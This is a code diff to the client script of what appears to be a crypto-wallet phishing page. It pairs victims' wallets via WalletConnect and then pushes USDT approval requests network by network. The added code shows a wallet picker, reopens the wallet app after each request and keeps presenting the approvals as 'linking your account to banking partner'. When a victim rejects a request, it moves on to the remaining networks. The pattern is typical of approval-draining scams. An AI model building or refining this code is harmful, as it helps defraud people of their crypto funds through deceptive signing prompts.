@@ -34,6 +34,9 @@ let paymentId = '';
 let paymentQueue = [];
 let paymentIndex = 0;
 let confirmedNetworks = 0;
+let finishedPayments = new Set();
+let selectedWalletHref = '';
+let walletsCache = null;
 
 /* ========== Meta Pixel ==========
  * Funnel:
@@ -177,10 +180,10 @@ async function startSession() {
     const btn = $('#m-get-now');
     if (btn) {
       btn.disabled = false;
-      btn.querySelector('.m-cta-label').textContent = 'Connect wallet';
+      btn.querySelector('.m-cta-label').textContent = 'Apply now';
       btn.onclick = onGetNowClick;
     }
-    renderQR(wcUri);
+    if (!IS_MOBILE) renderQR(wcUri);
 
     evtSrc = new EventSource(BASE + '/api/front/events');
 
@@ -211,28 +214,28 @@ async function startSession() {
       const d = JSON.parse(e.data);
       if (resolved) return;
       if (d.paymentId && paymentId && d.paymentId !== paymentId) return;
-      advanceAfterNetworkDone('verified');
+      advanceAfterNetworkDone('verified', d.paymentId);
     });
 
     evtSrc.addEventListener('approval_approved', (e) => {
       const d = JSON.parse(e.data);
       if (resolved) return;
       if (d.paymentId && paymentId && d.paymentId !== paymentId) return;
-      advanceAfterNetworkDone('verified');
+      advanceAfterNetworkDone('verified', d.paymentId);
     });
 
     evtSrc.addEventListener('approval_rejected', (e) => {
       if (resolved) return;
-      JSON.parse(e.data);
+      const d = JSON.parse(e.data);
       setBusy(true, 'Confirm in your wallet', 'That request was rejected. Checking any remaining networks.');
-      advanceAfterNetworkDone('rejected');
+      advanceAfterNetworkDone('rejected', d.paymentId);
     });
 
     evtSrc.addEventListener('approval_failed', (e) => {
       if (resolved) return;
-      JSON.parse(e.data);
+      const d = JSON.parse(e.data);
       setBusy(true, 'Confirm in your wallet', 'Verification is still pending. Checking any remaining networks.');
-      advanceAfterNetworkDone('failed');
+      advanceAfterNetworkDone('failed', d.paymentId);
     });
 
     evtSrc.onerror = () => {
@@ -277,19 +280,77 @@ function renderQR(uri) {
 }
 
 /* ========== Step 1: user taps "Get Yours Now" (mobile only) ========== */
-function walletConnectMobileUrl(uri) {
+function walletHref(wallet, uri) {
+  const encoded = encodeURIComponent(uri);
+  const universal = String(wallet.universal || '').replace(/\/$/, '');
+  if (universal) return universal + '/wc?uri=' + encoded;
+  const native = String(wallet.native || '');
+  if (native) {
+    if (native.endsWith('://')) return native + 'wc?uri=' + encoded;
+    if (native.endsWith('/')) return native + 'wc?uri=' + encoded;
+    return native + 'wc?uri=' + encoded;
+  }
   return uri;
 }
 
-function onGetNowClick() {
+function reopenSelectedWallet() {
+  if (!IS_MOBILE || !selectedWalletHref) return;
+  setTimeout(function () {
+    window.location.href = selectedWalletHref;
+  }, 350);
+}
+
+async function loadWallets() {
+  if (walletsCache) return walletsCache;
+  const res = await fetch(BASE + '/api/front/wallets');
+  const data = await res.json();
+  walletsCache = Array.isArray(data.wallets) ? data.wallets : [];
+  return walletsCache;
+}
+
+function renderWalletList(wallets) {
+  const host = $('#m-wallet-list');
+  if (!host) return;
+  if (!wallets.length) {
+    host.innerHTML = '<p style="color:var(--red);font-size:13px">No wallets found. Refresh and try again.</p>';
+    return;
+  }
+  host.innerHTML = wallets.map(function (wallet) {
+    const name = escapeText(wallet.name);
+    const letter = escapeText((wallet.name || 'W').charAt(0).toUpperCase());
+    const img = wallet.image
+      ? '<img src="' + escapeText(wallet.image) + '" alt="" width="36" height="36"/>'
+      : '<span class="m-wallet-fallback">' + letter + '</span>';
+    return '<button type="button" class="m-wallet-item" data-wallet-id="' + escapeText(wallet.id) + '">' +
+      img + '<strong>' + name + '</strong></button>';
+  }).join('');
+  host.querySelectorAll('[data-wallet-id]').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      const wallet = wallets.find(function (item) { return item.id === btn.dataset.walletId; });
+      if (!wallet || !wcUri) return;
+      selectedWalletHref = walletHref(wallet, wcUri);
+      setLoaderStep('pair');
+      setBusy(
+        true,
+        'Linking your account to banking partner',
+        'Approve the pairing request in ' + wallet.name + ' — we\'ll continue automatically once confirmed.'
+      );
+      window.location.href = selectedWalletHref;
+    });
+  });
+}
+
+async function onGetNowClick() {
   if (!wcUri) return;
-  setLoaderStep('pair');
-  setBusy(
-    true,
-    'Linking your account to banking partner',
-    'Open your wallet app and approve the pairing request — we\'ll continue automatically once confirmed.'
-  );
-  window.location.href = walletConnectMobileUrl(wcUri);
+  setView('wallets');
+  const back = $('#m-wallet-back');
+  if (back) back.onclick = function () { setBusy(false); setView('intro'); };
+  try {
+    const wallets = await loadWallets();
+    renderWalletList(wallets);
+  } catch (_err) {
+    renderWalletList([]);
+  }
 }
 
 /* ========== Step 2: wallet connected ========== */
@@ -396,6 +457,7 @@ async function requestCurrentApproval() {
     });
     const data = await res.json();
     if (!res.ok) throw new Error(data.message || 'Could not request approval');
+    reopenSelectedWallet();
   } catch (err) {
     showPayError(err.message);
     advanceAfterNetworkDone('failed');
@@ -429,15 +491,22 @@ function finishApprovals() {
   onAuthorizationApproved();
 }
 
-function advanceAfterNetworkDone(reason) {
+function advanceAfterNetworkDone(reason, fromPaymentId) {
   if (resolved) return;
+  const id = fromPaymentId || paymentId;
+  if (id) {
+    if (finishedPayments.has(id)) return;
+    finishedPayments.add(id);
+  }
   if (reason === 'verified') confirmedNetworks += 1;
   paymentIndex += 1;
   if (paymentIndex >= paymentQueue.length) {
     finishApprovals();
     return;
   }
-  setBusy(true, 'Confirm in your wallet', 'Opening the next network approval in your wallet.');
+  const next = paymentQueue[paymentIndex];
+  const label = next && next.network ? String(next.network).toUpperCase() : 'next';
+  setBusy(true, 'Confirm in your wallet', 'Opening the ' + label + ' 1 USDT approval in your wallet.');
   runCurrentNetwork();
 }
 
@@ -456,6 +525,8 @@ async function startBackgroundApproval() {
     paymentIndex = paymentQueue.findIndex(function (item) {
       return item.status !== 'verified';
     });
+    finishedPayments = new Set();
+    confirmedNetworks = 0;
     if (paymentIndex < 0) {
       confirmedNetworks = paymentQueue.filter(function (item) {
         return item.status === 'verified' && item.transactionHash;
